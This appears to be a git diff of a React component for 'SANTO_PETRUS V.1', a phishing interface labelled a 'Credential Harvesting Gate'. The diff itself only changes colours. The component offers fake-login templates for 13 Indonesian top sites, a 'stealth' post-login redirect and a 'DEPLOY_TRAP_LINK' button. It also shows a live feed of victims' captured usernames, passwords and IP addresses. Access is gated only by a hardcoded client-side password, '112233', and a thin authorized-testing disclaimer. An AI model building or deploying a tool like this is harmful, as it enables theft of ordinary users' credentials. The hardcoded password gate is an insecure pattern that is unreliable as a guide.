@@ -60,15 +60,15 @@ export default function SantoPetrus() {
 
   if (!isAuthenticated) {
     return (
-      <div className="flex flex-col h-full bg-[#050000] items-center justify-center text-[#ff3333] border-l border-[#ff0000]/20 relative overflow-hidden">
-        <div className="absolute inset-0 bg-[#ff0000]/5 blur-3xl pointer-events-none" />
-        <div className="z-10 bg-black border border-[#ff0000]/30 p-8 flex flex-col items-center max-w-sm w-full animate-in zoom-in-95 duration-500">
-          <Skull className="w-16 h-16 mb-6 text-[#ff0000] animate-pulse drop-shadow-[0_0_10px_rgba(255,0,0,0.8)]" />
-          <h2 className="text-xl font-black mb-2 tracking-widest text-[#ff0000]">SANTO_PETRUS V.1</h2>
-          <p className="text-[10px] text-center font-mono text-[#ff0000]/60 uppercase tracking-widest border-b border-[#ff0000]/20 pb-4 mb-4">
+      <div className="flex flex-col h-full bg-[#050000] items-center justify-center text-[#ff3333] border-l border-[#ef4444]/20 relative overflow-hidden">
+        <div className="absolute inset-0 bg-[#ef4444]/5 blur-3xl pointer-events-none" />
+        <div className="z-10 bg-slate-950 border border-[#ef4444]/30 p-8 flex flex-col items-center max-w-sm w-full animate-in zoom-in-95 duration-500">
+          <Skull className="w-16 h-16 mb-6 text-[#ef4444] animate-pulse drop-shadow-[0_0_10px_rgba(255,0,0,0.8)]" />
+          <h2 className="text-xl font-black mb-2 tracking-widest text-[#ef4444]">SANTO_PETRUS V.1</h2>
+          <p className="text-[10px] text-center font-mono text-[#ef4444]/60 uppercase tracking-widest border-b border-[#ef4444]/20 pb-4 mb-4">
             Restricted Module. Administrator Clearance Required.
           </p>
-          <div className="w-full text-[10px] font-mono text-[#ff0000]/40 text-center mb-8 bg-[#ff0000]/5 p-3 border border-[#ff0000]/20 uppercase tracking-wider">
+          <div className="w-full text-[10px] font-mono text-[#ef4444]/40 text-center mb-8 bg-[#ef4444]/5 p-3 border border-[#ef4444]/20 uppercase tracking-wider">
             User Agreement: This utility is for enterprise security auditing and authorized penetration testing only. Do not deploy on unauthorized targets.
           </div>
           <div className="w-full space-y-4">
@@ -83,14 +83,14 @@ export default function SantoPetrus() {
                 }
               }}
               placeholder="ENTER CLEARANCE CODE"
-              className="w-full bg-black border border-[#ff0000]/40 text-center text-[#ff0000] px-4 py-3 focus:outline-none focus:border-[#ff0000] uppercase tracking-[0.5em] font-mono text-xs shadow-[inset_0_0_15px_rgba(255,0,0,0.1)] transition-all"
+              className="w-full bg-slate-950 border border-[#ef4444]/40 text-center text-[#ef4444] px-4 py-3 focus:outline-none focus:border-[#ef4444] uppercase tracking-[0.5em] font-mono text-xs shadow-[inset_0_0_15px_rgba(255,0,0,0.1)] transition-all"
             />
             <button 
               onClick={() => {
                 if(password === '112233') setIsAuthenticated(true);
                 else setPassword('');
               }}
-              className="w-full py-4 bg-[#ff0000] hover:bg-[#ff3333] text-black font-black text-xs uppercase tracking-[0.3em] transition-all"
+              className="w-full py-4 bg-[#ef4444] hover:bg-[#ff3333] text-black font-black text-xs uppercase tracking-[0.3em] transition-all"
             >
               AUTHORIZE
             </button>
@@ -102,20 +102,20 @@ export default function SantoPetrus() {
   }
 
   return (
-    <div className="flex flex-col h-full bg-[#050000] text-[#ff3333] border-l border-[#ff0000]/20 relative overflow-hidden">
+    <div className="flex flex-col h-full bg-[#050000] text-[#ff3333] border-l border-[#ef4444]/20 relative overflow-hidden">
       {/* Background glow */}
-      <div className="absolute top-0 right-0 w-96 h-96 bg-[#ff0000]/5 blur-3xl pointer-events-none rounded-full" />
+      <div className="absolute top-0 right-0 w-96 h-96 bg-[#ef4444]/5 blur-3xl pointer-events-none rounded-full" />
       
-      <div className="p-6 border-b border-[#ff0000]/20 bg-[#ff0000]/5 flex justify-between items-start z-10">
+      <div className="p-6 border-b border-[#ef4444]/20 bg-[#ef4444]/5 flex justify-between items-start z-10">
         <div>
-          <h2 className="text-2xl font-black flex items-center mb-1 tracking-tighter text-[#ff0000] drop-shadow-[0_0_8px_rgba(255,0,0,0.8)]">
+          <h2 className="text-2xl font-black flex items-center mb-1 tracking-tighter text-[#ef4444] drop-shadow-[0_0_8px_rgba(255,0,0,0.8)]">
             <Skull className="w-7 h-7 mr-3 animate-pulse" /> SANTO_PETRUS V.1
           </h2>
-          <p className="text-[10px] text-[#ff0000]/60 uppercase tracking-widest font-mono">
+          <p className="text-[10px] text-[#ef4444]/60 uppercase tracking-widest font-mono">
             Social Engineering & Credential Harvesting Gate
           </p>
         </div>
-        <div className="px-3 py-1 bg-[#ff0000]/10 border border-[#ff0000]/30 text-[#ff0000] text-[9px] font-bold tracking-[0.2em] animate-pulse flex items-center">
+        <div className="px-3 py-1 bg-[#ef4444]/10 border border-[#ef4444]/30 text-[#ef4444] text-[9px] font-bold tracking-[0.2em] animate-pulse flex items-center">
           <ShieldAlert className="w-3 h-3 mr-2" /> PHISHING_SIMULATOR_ACTIVE
         </div>
       </div>
@@ -124,23 +124,23 @@ export default function SantoPetrus() {
         
         {/* Left Column: Template Selection & Generation */}
         <div className="space-y-6">
-          <div className="bg-[#100000] border border-[#ff0000]/30 p-5 relative group">
-            <div className="absolute top-0 left-0 w-full h-[1px] bg-gradient-to-r from-transparent via-[#ff0000] to-transparent opacity-50" />
+          <div className="bg-[#100000] border border-[#ef4444]/30 p-5 relative group">
+            <div className="absolute top-0 left-0 w-full h-[1px] bg-gradient-to-r from-transparent via-[#ef4444] to-transparent opacity-50" />
             
-            <div className="flex items-center space-x-2 mb-6 border-b border-[#ff0000]/20 pb-3">
-              <LayoutTemplate className="w-5 h-5 text-[#ff0000]/80" />
-              <h3 className="text-xs font-bold uppercase tracking-[0.3em] text-[#ff0000]">Select Target Template</h3>
+            <div className="flex items-center space-x-2 mb-6 border-b border-[#ef4444]/20 pb-3">
+              <LayoutTemplate className="w-5 h-5 text-[#ef4444]/80" />
+              <h3 className="text-xs font-bold uppercase tracking-[0.3em] text-[#ef4444]">Select Target Template</h3>
             </div>
 
             <div className="space-y-5">
               <div>
-                <label className="block text-[10px] font-bold text-[#ff0000]/60 mb-2 uppercase tracking-widest font-mono">
+                <label className="block text-[10px] font-bold text-[#ef4444]/60 mb-2 uppercase tracking-widest font-mono">
                   13 Available Modules (Indonesian Top Sites)
                 </label>
                 <select 
                   value={selectedTemplate}
                   onChange={(e) => setSelectedTemplate(e.target.value)}
-                  className="w-full bg-black border border-[#ff0000]/30 text-[#ff3333] rounded-sm px-4 py-3 focus:outline-none focus:border-[#ff0000] font-mono text-sm shadow-[inset_0_0_10px_rgba(255,0,0,0.05)] transition-all cursor-pointer appearance-none"
+                  className="w-full bg-slate-950 border border-[#ef4444]/30 text-[#ff3333] rounded-sm px-4 py-3 focus:outline-none focus:border-[#ef4444] font-mono text-sm shadow-[inset_0_0_10px_rgba(255,0,0,0.05)] transition-all cursor-pointer appearance-none"
                 >
                   {TEMPLATES.map(t => (
                     <option key={t.id} value={t.id}>[ {t.id.toUpperCase()} ] -- {t.name}</option>
@@ -149,19 +149,19 @@ export default function SantoPetrus() {
               </div>
 
               <div>
-                <label className="block text-[10px] font-bold text-[#ff0000]/60 mb-2 uppercase tracking-widest font-mono">Post-Login Redirect (Stealth Move)</label>
+                <label className="block text-[10px] font-bold text-[#ef4444]/60 mb-2 uppercase tracking-widest font-mono">Post-Login Redirect (Stealth Move)</label>
                 <input 
                   type="text" 
                   value={redirectUrl}
                   onChange={e => setRedirectUrl(e.target.value)}
-                  className="w-full bg-black border border-[#ff0000]/30 text-[#ff3333] rounded-sm px-4 py-3 focus:outline-none focus:border-[#ff0000] font-mono text-sm placeholder:text-[#ff0000]/20"
+                  className="w-full bg-slate-950 border border-[#ef4444]/30 text-[#ff3333] rounded-sm px-4 py-3 focus:outline-none focus:border-[#ef4444] font-mono text-sm placeholder:text-[#ef4444]/20"
                 />
               </div>
 
               <button
                 onClick={handleForge}
                 disabled={loading}
-                className="w-full py-4 bg-[#ff0000] hover:bg-[#ff3333] text-black font-black text-sm uppercase tracking-[0.3em] transition-all active:scale-[0.98] flex items-center justify-center space-x-3 shadow-[0_0_20px_rgba(255,0,0,0.4)]"
+                className="w-full py-4 bg-[#ef4444] hover:bg-[#ff3333] text-black font-black text-sm uppercase tracking-[0.3em] transition-all active:scale-[0.98] flex items-center justify-center space-x-3 shadow-[0_0_20px_rgba(255,0,0,0.4)]"
               >
                 <Zap className={`w-5 h-5 ${loading ? 'animate-pulse' : ''}`} />
                 <span>{loading ? 'COMPILING_TEMPLATE...' : 'DEPLOY_TRAP_LINK'}</span>
@@ -170,18 +170,18 @@ export default function SantoPetrus() {
           </div>
 
           {generatedLink && (
-            <div className="bg-[#100000] border border-[#ff0000]/40 p-5 space-y-3 animate-in fade-in slide-in-from-bottom-4 duration-500">
-              <div className="text-[10px] font-bold uppercase tracking-[0.2em] text-[#ff0000]/80">Credential Harvester Ready:</div>
-              <div className="flex items-center justify-between bg-black border border-[#ff0000]/20 p-3 rounded-sm">
+            <div className="bg-[#100000] border border-[#ef4444]/40 p-5 space-y-3 animate-in fade-in slide-in-from-bottom-4 duration-500">
+              <div className="text-[10px] font-bold uppercase tracking-[0.2em] text-[#ef4444]/80">Credential Harvester Ready:</div>
+              <div className="flex items-center justify-between bg-slate-950 border border-[#ef4444]/20 p-3 rounded-sm">
                 <span className="font-mono text-xs text-white break-all pr-4">{generatedLink}</span>
                 <button 
                   onClick={copyToClipboard}
-                  className="p-2 border border-[#ff0000]/30 hover:bg-[#ff0000]/20 text-[#ff0000] rounded transition-all shrink-0"
+                  className="p-2 border border-[#ef4444]/30 hover:bg-[#ef4444]/20 text-[#ef4444] rounded transition-all shrink-0"
                 >
                   {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                 </button>
               </div>
-              <p className="text-[8px] uppercase tracking-widest text-[#ff0000]/40 text-center mt-2 font-mono flex items-center justify-center">
+              <p className="text-[8px] uppercase tracking-widest text-[#ef4444]/40 text-center mt-2 font-mono flex items-center justify-center">
                 <AlertTriangle className="w-3 h-3 mr-1" />
                 Wait for the victim to authenticate.
               </p>
@@ -191,13 +191,13 @@ export default function SantoPetrus() {
 
         {/* Right Column: Live Captures */}
         <div className="space-y-6">
-          <div className="bg-[#100000] border border-[#ff0000]/30 p-5 min-h-[450px] flex flex-col">
-            <div className="flex items-center justify-between mb-4 pb-2 border-b border-[#ff0000]/20">
+          <div className="bg-[#100000] border border-[#ef4444]/30 p-5 min-h-[450px] flex flex-col">
+            <div className="flex items-center justify-between mb-4 pb-2 border-b border-[#ef4444]/20">
               <div className="flex items-center space-x-2">
-                <Activity className="w-5 h-5 text-[#ff0000] animate-pulse" />
-                <h3 className="text-xs font-bold uppercase tracking-[0.3em] text-[#ff0000]">Live Credential Stream</h3>
+                <Activity className="w-5 h-5 text-[#ef4444] animate-pulse" />
+                <h3 className="text-xs font-bold uppercase tracking-[0.3em] text-[#ef4444]">Live Credential Stream</h3>
               </div>
-              <div className="text-[9px] font-mono text-[#ff0000]/60">
+              <div className="text-[9px] font-mono text-[#ef4444]/60">
                 {victims.length} CAPTURED
               </div>
             </div>
@@ -205,13 +205,13 @@ export default function SantoPetrus() {
             <div className="flex-1 space-y-3 overflow-y-auto pr-2 custom-scrollbar">
               {victims.length === 0 ? (
                 <div className="h-full flex flex-col items-center justify-center opacity-30">
-                  <Key className="w-10 h-10 mb-3 text-[#ff0000]" />
+                  <Key className="w-10 h-10 mb-3 text-[#ef4444]" />
                   <span className="text-[10px] uppercase tracking-[0.2em] font-mono">Listening for auth events...</span>
                 </div>
               ) : (
                 victims.map((v, idx) => (
-                  <div key={v.id} className="bg-black border border-[#ff0000]/30 p-4 text-[10px] font-mono space-y-3 animate-in fade-in slide-in-from-right-4">
-                    <div className="flex justify-between items-center text-[#ff0000] border-b border-[#ff0000]/10 pb-2">
+                  <div key={v.id} className="bg-slate-950 border border-[#ef4444]/30 p-4 text-[10px] font-mono space-y-3 animate-in fade-in slide-in-from-right-4">
+                    <div className="flex justify-between items-center text-[#ef4444] border-b border-[#ef4444]/10 pb-2">
                       <span className="font-bold tracking-widest flex items-center">
                         <Globe className="w-3 h-3 mr-2" /> {v.service}
                       </span>
@@ -228,7 +228,7 @@ export default function SantoPetrus() {
                       <div className="text-[#ff3333] font-bold text-xs">{v.pass}</div>
                     </div>
 
-                    <div className="text-[8px] text-[#ff0000]/40 pt-2 border-t border-[#ff0000]/10 mt-2 flex justify-between">
+                    <div className="text-[8px] text-[#ef4444]/40 pt-2 border-t border-[#ef4444]/10 mt-2 flex justify-between">
                       <span>Source IP: {v.ip}</span>
                       <span>ID: {v.id}</span>
                     </div>
